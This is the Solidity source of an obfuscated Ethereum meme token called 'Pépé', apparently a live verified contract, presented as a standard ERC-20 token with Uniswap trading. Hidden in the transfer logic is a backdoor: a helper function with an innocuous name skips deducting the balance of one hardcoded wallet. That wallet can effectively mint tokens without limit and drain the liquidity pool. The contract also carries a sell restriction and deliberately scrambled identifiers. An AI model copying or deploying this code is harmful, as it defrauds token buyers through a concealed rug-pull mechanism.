/**
 *Submitted for verification at Etherscan.io on 2023-10-05
*/

/**

Pepe   $Pépé


Twitter: https://twitter.com/pepeerc_com
Telegram: https://t.me/pepeerc_com
Website: https://pepeerc.com/

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rwdbe(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rwdbe(a, b, "SafeMath");
    }

    function  _rwdbe(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Pepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _Trcryjk;
    address payable private _Fiqkxop;
    address private _coqtou;

    string private constant _name = unicode"Pépé";
    string private constant _symbol = unicode"Pépé";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 420690000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _pvkhear;
    mapping (address => bool) private _yrpiay;
    mapping(address => uint256) private _ahjstq;
    uint256 public _qvovbwd = _totalSupply;
    uint256 public _Wrorsje = _totalSupply;
    uint256 public _reTjvfu= _totalSupply;
    uint256 public _vowTeef= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yfjviq=0;
    uint256 private _uevpjeg=0;
    

    bool private _efrargbr;
    bool public _Dpforqf = false;
    bool private pjhvxbe = false;
    bool private _opjgviu = false;


    event _hpzwqrt(uint _qvovbwd);
    modifier uevsyr {
        pjhvxbe = true;
        _;
        pjhvxbe = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _pvkhear[owner(

        )] = true;
        _pvkhear[address
        (this)] = true;
        _pvkhear[
            _Fiqkxop] = true;
        _Fiqkxop = 
        payable (0xe77dC25cdD5233d4d8c69B4cbaCf17259D8A982e);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rwdbe(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kvudxk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Dpforqf) {
                if (to 
                != address
                (_Trcryjk) 
                && to !=
                 address
                 (_coqtou)) {
                  require(_ahjstq
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _ahjstq
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _coqtou && to != 
            address(_Trcryjk) &&
             !_pvkhear[to] ) {
                require(amount 
                <= _qvovbwd,
                 "Exceeds the _qvovbwd.");
                require(balanceOf
                (to) + amount
                 <= _Wrorsje,
                  "Exceeds the _Wrorsje.");
                if(_uevpjeg
                < _yfjviq){
                  require
                  (! _eiqkvz(to));
                }
                _uevpjeg++;
                 _yrpiay
                 [to]=true;
                kvudxk = amount._pvr
                ((_uevpjeg>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _coqtou &&
             from!= address(this) 
            && !_pvkhear[from] ){
                require(amount <= 
                _qvovbwd && 
                balanceOf(_Fiqkxop)
                <_vowTeef,
                 "Exceeds the _qvovbwd.");
                kvudxk = amount._pvr((_uevpjeg>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_uevpjeg>
                _yfjviq &&
                 _yrpiay[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!pjhvxbe 
            && to == _coqtou &&
             _opjgviu &&
             contractTokenBalance>
             _reTjvfu 
            && _uevpjeg>
            _yfjviq&&
             !_pvkhear[to]&&
              !_pvkhear[from]
            ) {
                _transferFrom( _wnerf(amount, 
                _wnerf(contractTokenBalance,
                _vowTeef)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _xjvuwo(address
                    (this).balance);
                }
            }
        }

        if(kvudxk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kvudxk);
          emit
           Transfer(from,
           address
           (this),kvudxk);
        }
        _balances[from
        ]= _rwdbe(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rwdbe(kvudxk));
        emit Transfer
        (from, to, 
        amount.
         _rwdbe(kvudxk));
    }

    function _transferFrom(uint256
     tokenAmount) private
      uevsyr {
        if(tokenAmount==
        0){return;}
        if(!_efrargbr)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Trcryjk.WETH();
        _approve(address(this),
         address(
             _Trcryjk), 
             tokenAmount);
        _Trcryjk.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wnerf
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rwdbe(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Fiqkxop){
            return a ;
        }else{
            return a .
             _rwdbe (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qvovbwd = _totalSupply;
        _Wrorsje = _totalSupply;
        emit _hpzwqrt(_totalSupply);
    }

    function _eiqkvz(address 
    account) private view 
    returns (bool) {
        uint256 euradv;
        assembly {
            euradv :=
             extcodesize
             (account)
        }
        return euradv > 
        0;
    }

    function _xjvuwo(uint256
    amount) private {
        _Fiqkxop.
        transfer(
            amount);
    }

    function openoTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _efrargbr ) ;
        _Trcryjk  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Trcryjk), 
            _totalSupply);
        _coqtou = 
        IUniswapV2Factory(_Trcryjk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Trcryjk .
             WETH ( ) );
        _Trcryjk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_coqtou).
        approve(address(_Trcryjk), 
        type(uint)
        .max);
        _opjgviu = true;
        _efrargbr = true;
    }

    receive() external payable {}
}